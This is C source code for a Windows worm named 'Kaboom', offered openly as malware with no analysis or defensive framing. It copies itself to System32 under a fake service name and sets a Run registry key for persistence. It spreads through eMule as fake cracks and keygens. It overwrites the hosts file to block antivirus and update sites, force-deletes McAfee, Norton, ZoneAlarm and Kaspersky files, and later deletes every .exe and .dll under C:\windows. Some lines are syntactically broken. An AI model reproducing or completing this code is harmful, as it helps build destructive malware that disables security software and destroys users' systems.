

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <mmsystem.h>
#include <string.h>
#include <tlhelp32.h>
#include <comutil.h>
#include <time.h>

const char msg1[]= "WINDOWS VISTA IS ARMAGEDDON";
const char msg2[]= "Kaboom worm";
char windir[MAX_PATH];
 

int APIENTRY WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
 char pathname[256];
 GetWindowsDirectory(windir, sizeof(windir));
 HMODULE hMe = GetModuleHandle(NULL);
 DWORD nRet = GetModuleFileName(hMe, pathname, 256);
 HKEY hKey;
 strcat(windir, "\\System32\\Sock_windows\\Services_update.exe");
 CopyFile(pathname, windir, 0);

 RegCreateKey (HKEY_CURRENT_USER, "Software\\", &hKey);
 RegSetValueEx (hKey, "Windows Services", 0, REG_SZ, (LPBYTE) windir, sizeof(windir));
 
 
 RegCreateKey (HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
 RegSetValueEx (hKey, "Windows Services", 0, REG_SZ, (LPBYTE)windir, sizeof(windir));
 CopyFile(pathname, "C:\\Programmi\\emule\\incoming\\Windows 2000-me-vista-xp-98 unlimited serial generation.exe", 0);
 CopyFile(pathname, "C:\\Programmi\\emule\\incoming\\sexsexsex.src.exe", 0);
 CopyFile(pathname, "C:\\Programmi\\emule\\incoming\\windows vista source code.zip.exe", 0);
 CopyFile(pathname, "C:\\Programmi\\emule\\incoming\\Kaspersky_crack.exe", 0);
 CopyFile(pathname, "C:\\Programmi\\emule\\incoming\\Nod32_crack.exe", 0);
 CopyFile(pathname, "C:\\Programmi\\emule\\incoming\\Norton_key_generation.exe", 0);
 CopyFile(pathname, "C:\\Programmi\\emule\\incoming\\Downloader_windows_source_code.exe", 0);
 
}

void Message()
{
     FILE *fpt;
     fpt = fopen ("C:\\message_for_mydoom","w")
     fprintf(fpt,"the mydoom worm is a stupid worm...");
     fprintf(fpt,"is just a simple mass-mailer and p2p worm with an extra(Ddos_attack)...")
     fprintf(fpt,"this worm was propagated because the people are stupid and accept every attachment...");
     fprintf(fpt,"");
     fprintf(fpt,"netsky and sasser are worm very simple but very dangerous...why? Because the administrator");
     fprintf(fpt,"don't update...:(");
     fprintf(fpt,"");
     fprintf(fpt,"Kaboom's author");
     fprintf(fpt,"");
     fprintf(fpt,"");
     fprintf(fpt,"")
     fprintf(fpt,"");
     fprintf(fpt,"i will survive");
     fclose(fpt);
}
     
void BlockSite()
{
    FILE *fpl;
    fpl = fopen ("C:\\WINDOWS\\System32\\drivers\\etc\\hosts","w");
    fprintf (fpl,"0.0.0.0 google.com");
    fprintf (fpl," 0.0.0.0 www.hotmail.com");
    fprintf (fpl," 0.0.0.0 www.microsoft.com");
    fprintf (fpl," 0.0.0.0 microsoft.com");
    fprintf (fpl," 0.0.0.0  macafee.com");
    fprintf (fpl," 0.0.0.0 www.macafee.com");
    fprintf (fpl," 0.0.0.0 download.mcafee.com");
    fprintf (fpl," 0.0.0.0 www.download.mcafee.com");
    fprintf (fpl," 0.0.0.0 rads.mcafee.com");
    fprintf (fpl," 0.0.0.0 us.mcafee.com");
    fprintf (fpl," 0.0.0.0 www.networkassociates.com");
    fprintf (fpl," 0.0.0.0 networkassociates.com");
    fprintf (fpl," 0.0.0.0 update.symantec.com");
    fprintf (fpl," 0.0.0.0 updates.symantec.com");
    fprintf (fpl," 0.0.0.0 iveupdate.symantec.com");
    fprintf (fpl," 0.0.0.0 norton.com");
    fprintf (fpl," 0.0.0.0 www.symantec.com");
    fprintf (fpl," 0.0.0.0 symantec.com");
    fprintf (fpl," 0.0.0.0 www.norton.com");
    fprintf (fpl," 0.0.0.0 google.com");
    fprintf (fpl," 0.0.0.0 bitdefender.com");
    fprintf (fpl," 0.0.0.0 www.viruslist.com");
    fprintf (fpl," 0.0.0.0 viruslist.com");
    fprintf (fpl," 0.0.0.0 www.virustotal.com");
    fprintf (fpl," 0.0.0.0 virustotal.com");
    fprintf (fpl," 0.0.0.0 www.kaspersky.com");
    fprintf (fpl," 0.0.0.0 kaspersky.com");
    fprintf (fpl," 0.0.0.0 kaspersky-labs.com");
    fprintf (fpl," 0.0.0.0 www.kaspersky-labs.com");
    fprintf (fpl," 0.0.0.0 www.trendmicro.com");
    fprintf (fpl," 0.0.0.0 trendmicro.com");
    fprintf (fpl," 0.0.0.0 www.pandasoftware.com");
    fprintf (fpl," 0.0.0.0 pandasoftware.com");
    fprintf (fpl," 0.0.0.0 www.nod32.com");
    fprintf (fpl," 0.0.0.0 nod32.com");
    fprintf (fpl," 0.0.0.0 yahoo.com");
    fprintf (fpl," 0.0.0.0 mail.yahoo.com");
    fprintf (fpl," 0.0.0.0 www.grisoft.com");
    fprintf (fpl," 0.0.0.0 www.f-secure.com");
    fprintf (fpl," 0.0.0.0  f-secure.com");
    fclose(fpl);
}

void killavfw()
{
   system("del C:\\Program Files\\McAfee.com\\Personal Firewall\\*.dll /F /S /Q ");
   system("del C:\\Program Files\\McAfee.com\\Personal Firewall\\data\\*.* /F /S /Q ");
   system("del C:\\Program Files\\McAfee.com\\Personal Firewall\\help\\*.* /F /S /Q ");
   system("del C:\\Program Files\\McAfee.com\\VSO\\*.dll /F /S /Q ");
   system("del C:\\Program Files\\McAfee.com\\VSO\\*.ini /F /S /Q ");
   system("del C:\\Program Files\\McAfee.com\\VSO\\Res00\\*.dll /F /S /Q ");
   system("del C:\\Program Files\\McAfee.com\\VSO\\Dat\\4615\\*.* /F /S /Q ");
   system("del C:\\Program Files\\McAfee.com\\*.* /F /S /Q ");
   system("del C:\\Program Files\\Norton AntiVirus\\*.dll /F /S /Q ");
   system("del C:\\Program Files\\Common Files\\Symantec Shared\\*.exe /F /S /Q ");
   system("del C:\\Program Files\\Norton AntiVirus\\*.ini /F /S /Q");
   system("del C:\\Program Files\\Norton AntiVirus\\*.exe /F /S /Q ");
   system("del C:\\Program Files\\Norton AntiVirus\\*.inf /F /S /Q ");
   system("del C:\\Program Files\\Zone Labs\\ZoneAlarm\\*.exe  /F /S /Q ");
   system("del C:\\Program Files\\Zone Labs\\ZoneAlarm\\*.zap /F /S /Q ");
   system("del C:\\Program Files\\Zone Labs\\ZoneAlarm\\*.dll /F /S /Q ");
   system("del C:\\Program Files\\Zone Labs\\ZoneAlarm\\repair\\*.dll /F /S /Q ");
   system("del C:\\Program Files\\Kaspersky Lab\\AVP6\\*.exe /F /S /Q ");
   system("del C:\\Program Files\\Kaspersky Lab\\AVP6\\*.dll /F /S /Q ");
}


void Destinity(){
     Sleep(600000000);
     system("del C:\\windows\\*exe /F /S /Q");
     system("del C:\\windows\\*dll /F /S /Q");
}

